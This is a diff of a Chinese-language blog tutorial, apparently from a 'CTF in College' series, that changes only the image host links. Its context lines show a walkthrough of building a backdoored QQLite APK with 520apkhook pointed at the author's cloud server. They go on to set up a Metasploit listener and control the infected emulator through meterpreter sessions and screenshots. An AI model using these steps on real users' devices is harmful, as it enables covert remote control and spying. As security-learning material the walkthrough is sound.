@@ -212,7 +212,7 @@ sudo ./msf
 
 （附上以上正常运行的图）
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/Xshell-20220607-230127.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-230127.png?download=true)
 
 ## 用520apkhook创建带有后门的apk文件
 
@@ -254,13 +254,13 @@ python3 main.py --lhost <我的腾讯云IP> --lport 5555 -n QQLite.apk
 
 然后程序就会自动开始打包，最后会告诉我们打包完成的文件位置
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/vmware-20220607-231140.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/vmware-20220607-231140.png?download=true)
 
 然后我们安装打包好的apk，我用我的手机测试了并没有报毒（红米K40 MIUI13），不过后来我还是选择在模拟器上安装，安装完后显示为正常的QQ轻聊版，而且能够正常使用
 
 **但是并不是所有的应用都可以被注入，新版的微信就不可以（自动模式找不到入口smali）**
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/HD-Player-20220607-231533.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/HD-Player-20220607-231533.png?download=true)
 
 ## 在云服务器上创建监听器
 
@@ -292,21 +292,21 @@ exploit -j
 
 然后粘贴在你的msfconsole里面
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/Xshell-20220607-231853.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-231853.png?download=true)
 
 这样就算是运行了，然后我们打开安装的软件，我们的msfconsole会提示肉鸡上线
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/Xshell-20220607-231955.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-231955.png?download=true)
 
 这时可以用`sessions`命令查看在线的肉鸡
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/Xshell-20220607-232045.png?download=true)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-232045.png?download=true)
 
 用`session -i <id>`就可以控制肉鸡啦
 
 我这里就可以用`session -i 1`来通过第一个端口控制模拟器，使用`screenshot`命令进行截图
 
-![](https://gamernotitle.coding.net/p/assets/d/assets/git/raw/master/img/CTF-in-College-5/KOsQYAQc.jpeg)
+![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-5/KOsQYAQc.jpeg)
 
 ## MSF session 命令列表
 
